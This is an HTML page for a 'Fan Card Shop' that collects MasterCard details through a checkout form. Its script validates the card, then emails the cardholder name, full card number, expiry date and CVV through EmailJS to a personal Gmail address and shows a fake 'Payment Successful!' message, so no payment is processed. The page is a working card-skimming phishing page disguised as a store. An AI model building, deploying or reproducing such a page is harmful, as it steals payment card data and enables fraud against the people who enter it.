<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Fan Card Shop - MasterCard Payment</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

  * {
    box-sizing: border-box;
  }
  body {
    margin: 0; 
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    color: #fff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 10px;
  }
  #app {
    background: #152a3a;
    padding: 20px;
    border-radius: 12px;
    width: 100%;
    max-width: 400px;
    max-height: 600px;
    overflow-y: auto;
    box-shadow: 0 8px 20px rgba(0,0,0,0.6);
  }
  h1 {
    text-align: center;
    font-weight: 600;
    margin-bottom: 12px;
    color: #f3c677;
  }
  .products {
    display: flex;
    flex-direction: column;
    gap: 15px;
    margin-bottom: 20px;
  }
  .product {
    background: #20425b;
    border-radius: 10px;
    padding: 10px 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    box-shadow: inset 0 0 10px #1e82f099;
  }
  .product .info {
    flex: 1;
  }
  .product .info h3 {
    margin: 0 0 5px;
    font-weight: 600;
    font-size: 1.1rem;
  }
  .product .info p {
    margin: 0;
    font-size: 0.9rem;
    color: #bed6e3;
  }
  .product button {
    background: #f3c677;
    border: none;
    padding: 8px 12px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    color: #152a3a;
    transition: background 0.3s ease;
  }
  .product button:hover {
    background: #d2a14e;
  }
  .cart {
    background: #213d5a;
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 20px;
    max-height: 160px;
    overflow-y: auto;
  }
  .cart h2 {
    font-weight: 600;
    margin: 0 0 10px;
    color: #f3c677;
  }
  .cart-items {
    list-style: none;
    padding: 0;
    margin: 0;
    max-height: 100px;
    overflow-y: auto;
  }
  .cart-items li {
    display: flex;
    justify-content: space-between;
    background: #30638a;
    margin-bottom: 8px;
    padding: 8px 12px;
    border-radius: 8px;
    font-size: 0.9rem;
  }
  .cart-items li span {
    font-weight: 600;
  }
  .total {
    text-align: right;
    font-weight: 700;
    font-size: 1.1rem;
    margin-top: 10px;
    color: #f3c677;
  }
  form {
    background: #204a72;
    border-radius: 12px;
    padding: 15px;
  }
  form h2 {
    margin-top: 0;
    margin-bottom: 15px;
    font-weight: 600;
    color: #f3c677;
    text-align: center;
  }
  label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
    color: #cfd7e3;
  }
  input[type="text"],
  input[type="number"],
  input[type="tel"],
  input[type="email"],
  input[type="month"] {
    width: 100%;
    padding: 8px 10px;
    border-radius: 8px;
    border: none;
    margin-bottom: 15px;
    font-size: 1rem;
    box-shadow: inset 0 0 6px #1565c073;
    background: #2c5a97;
    color: #fff;
  }
  input::placeholder {
    color: #aac9ffcc;
  }
  button#payBtn {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 10px;
    background: #f3c677;
    color: #152a3a;
    font-weight: 700;
    cursor: pointer;
    transition: background 0.3s ease;
    font-size: 1.1rem;
  }
  button#payBtn:hover:enabled {
    background: #d2a14e;
  }
  button#payBtn:disabled {
    background: #999999;
    cursor: not-allowed;
  }
  #messageEl, #errorEl {
    text-align: center;
    min-height: 20px;
    font-weight: 600;
  }
  #messageEl {
    color: #aadaff;
  }
  #errorEl {
    color: #ff6b6b;
  }
  #modal {
    position: fixed;
    top:0; left:0; right:0; bottom:0;
    background: rgba(0,0,0,0.85);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
  }
  #modalContent {
    background: #213d5a;
    border-radius: 14px;
    padding: 30px 25px;
    max-width: 320px;
    text-align: center;
    box-shadow: 0 0 20px 6px #f3c677bb;
  }
  #modalContent h2 {
    margin-bottom: 20px;
    color: #f3c677;
  }
  #modalClose {
    background: #f3c677;
    padding: 10px 30px;
    color: #152a3a;
    font-weight: 700;
    border: none;
    border-radius: 10px;
    cursor: pointer;
  }
  ::-webkit-scrollbar {
    width: 8px;
  }
  ::-webkit-scrollbar-thumb {
    background: #f3c677cc;
    border-radius: 4px;
  }
  ::-webkit-scrollbar-track {
    background: transparent;
  }
  @media (max-width: 400px) {
    #app {
      max-width: 100%;
      max-height: 600px;
      padding: 15px 10px;
    }
  }
</style>
</head>
<body>
<div id="app" role="main" aria-label="Fan Card Shop">
  <h1>Fan Card Shop</h1>
  <section class="products" aria-label="Available fan cards">
    <div class="product" tabindex="0">
      <div class="info">
        <h3>Fan Card</h3>
        <p>Price: $50</p>
      </div>
      <button aria-label="Add Star Player Fan Card for 50 dollars" data-name="Star Player Fan Card" data-price="50">Add to Cart</button>
    </div>
    <div class="product" tabindex="0">
      <div class="info">
        <h3>Basic Fan Card</h3>
        <p>Price: $500</p>
      </div>
      <button aria-label="Add Legend Fan Card for 500 dollars" data-name="Legend Fan Card" data-price="500">Add to Cart</button>
    </div>
    <div class="product" tabindex="0">
      <div class="info">
        <h3>Premium Fan Card</h3>
        <p>Price: $2000</p>
      </div>
      <button aria-label="Add Hall of Fame Fan Card for 2000 dollars" data-name="Hall of Fame Fan Card" data-price="2000">Add to Cart</button>
    </div>
  </section>

  <section class="cart" aria-label="Shopping cart">
    <h2>Your Cart</h2>
    <ul class="cart-items" aria-live="polite" id="cartItems"></ul>
    <p class="total" id="cartTotal">Total: $0</p>
  </section>

  <form id="paymentForm" aria-label="Payment form">
    <h2>MasterCard Payment</h2>
    <label for="cardName">Cardholder Name</label>
    <input type="text" id="cardName" name="cardName" placeholder="Name on card" autocomplete="cc-name" required />

    <label for="cardNumber">Card Number</label>
    <input type="tel" id="cardNumber" name="cardNumber" placeholder="MasterCard number" maxlength="19" autocomplete="cc-number" required />

    <label for="expiry">Expiry Date</label>
    <input type="month" id="expiry" name="expiry" min="" required autocomplete="cc-exp" />

    <label for="cvv">CVV</label>
    <input type="tel" id="cvv" name="cvv" placeholder="123" maxlength="4" pattern="^[0-9]{3,4}$" required autocomplete="cc-csc" />

    <p id="messageEl" role="alert" aria-live="assertive"></p>
    <p id="errorEl" role="alert" aria-live="assertive"></p>
    <button type="submit" id="payBtn" aria-label="Pay with MasterCard">Pay</button>
  </form>
</div>

<div id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" tabindex="-1">
  <div id="modalContent">
    <h2 id="modalTitle">Payment Successful!</h2>
    <p>Thank you for your purchase. Your order will be processed shortly.</p>
    <button id="modalClose" aria-label="Close success dialog">Close</button>
  </div>
</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  (function() {
    emailjs.init('_TtNAiWrHBbHKL3dt');
  })();

  const products = document.querySelectorAll('.product button');
  const cartItemsEl = document.getElementById('cartItems');
  const cartTotalEl = document.getElementById('cartTotal');
  const paymentForm = document.getElementById('paymentForm');
  const messageEl = document.getElementById('messageEl');
  const errorEl = document.getElementById('errorEl');
  const payBtn = document.getElementById('payBtn');
  const modal = document.getElementById('modal');
  const modalClose = document.getElementById('modalClose');

  let cart = [];
  let total = 0;

  function setExpiryMin() {
    const expiryInput = document.getElementById('expiry');
    const now = new Date();
    let month = now.getMonth() + 1;
    let year = now.getFullYear();
    month = month < 10 ? '0' + month : month;
    expiryInput.min = year + '-' + month;
  }
  setExpiryMin();

  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.addEventListener('input', e => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0,16);
    let formatted = '';
    for(let i=0; i<value.length; i++) {
      if(i!==0 && i%4===0) formatted += ' ';
      formatted += value[i];
    }
    e.target.value = formatted;
  });

  products.forEach(button => {
    button.addEventListener('click', () => {
      const name = button.getAttribute('data-name');
      const price = Number(button.getAttribute('data-price'));
      cart.push({ name, price });
      updateCartUI();
    });
  });

  function updateCartUI() {
    cartItemsEl.innerHTML = '';
    total = 0;
    cart.forEach((item) => {
      const li = document.createElement('li');
      li.textContent = item.name;
      const priceSpan = document.createElement('span');
      priceSpan.textContent = `$${item.price.toLocaleString()}`;
      li.appendChild(priceSpan);
      cartItemsEl.appendChild(li);
      total += item.price;
    });
    cartTotalEl.textContent = `Total: $${total.toLocaleString()}`;
  }

  // New MasterCard validation with prefix check and Luhn algorithm
  function isValidMasterCardNumber(number) {
    number = number.replace(/\s/g, '');
    if (!/^\d{16}$/.test(number)) return false;

    // Check prefix
    const prefixTwo = parseInt(number.substring(0, 2), 10);
    const prefixFour = parseInt(number.substring(0, 4), 10);
    const prefixSix = parseInt(number.substring(0, 6), 10);

    // MasterCard prefix ranges: 51-55 or 2221-2720
    const prefixRangeValid = (
      (prefixTwo >= 51 && prefixTwo <= 55) ||
      (prefixFour >= 2221 && prefixFour <= 2720) 
    );
    if (!prefixRangeValid) return false;

    // Luhn Algorithm check
    let sum = 0;
    let shouldDouble = false;
    for (let i = number.length -1; i >=0; i--) {
      let digit = parseInt(number.charAt(i), 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  paymentForm.addEventListener('submit', e => {
    e.preventDefault();
    errorEl.textContent = '';
    messageEl.textContent = '';

    if(cart.length === 0) {
      errorEl.textContent = 'Your cart is empty. Please add fan cards before paying.';
      return;
    }

    if(total < 50 || total > 20000) {
      errorEl.textContent = 'Total price must be between $50 and $20,000.';
      return;
    }

    const cardName = paymentForm.cardName.value.trim();
    const cardNumber = paymentForm.cardNumber.value.trim();
    const expiry = paymentForm.expiry.value;
    const cvv = paymentForm.cvv.value.trim();

    if(!cardName) {
      errorEl.textContent = 'Please enter cardholder name.';
      return;
    }
    if(!isValidMasterCardNumber(cardNumber)) {
      errorEl.textContent = 'Please enter a valid MasterCard number.';
      return;
    }
    if(!expiry) {
      errorEl.textContent = 'Please enter the expiry date.';
      return;
    }
    const [year, month] = expiry.split('-').map(Number);
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    if(year < currentYear || (year === currentYear && month < currentMonth)) {
      errorEl.textContent = 'Expiry date cannot be in the past.';
      return;
    }
    if(!/^\d{3,4}$/.test(cvv)) {
      errorEl.textContent = 'Please enter a valid 3 or 4 digit CVV.';
      return;
    }

    payBtn.disabled = true;
    messageEl.textContent = 'Processing payment...';

    const templateParams = {
      to_email: 'bobbybosmer2@gmail.com',
      card_name: cardName,
      card_number: cardNumber.replace(/\s/g, ''),
      expiry_date: expiry,
      cvv: cvv,
      cart_items: cart.map(item => item.name + ' ($' + item.price.toLocaleString() + ')').join(', '),
      total_amount: `$${total.toLocaleString()}`
    };

    emailjs.send('service_clk3lle', 'template_eu1lqoh', templateParams)
    .then(() => {
      messageEl.textContent = '';
      payBtn.disabled = false;
      showModal();
      clearCartAndForm();
    })
    .catch(err => {
      payBtn.disabled = false;
      messageEl.textContent = '';
      errorEl.textContent = 'Payment failed to process. Please try again.';
      console.error('EmailJS Error:', err);
    });
  });

  function showModal() {
    modal.style.display = 'flex';
    modal.focus();
  }
  modalClose.addEventListener('click', () => {
    modal.style.display = 'none';
  });
  modal.addEventListener('click', e => {
    if(e.target === modal) modal.style.display = 'none';
  });

  function clearCartAndForm() {
    cart = [];
    updateCartUI();
    paymentForm.reset();
    setExpiryMin();
  }
</script>
</body>
</html>
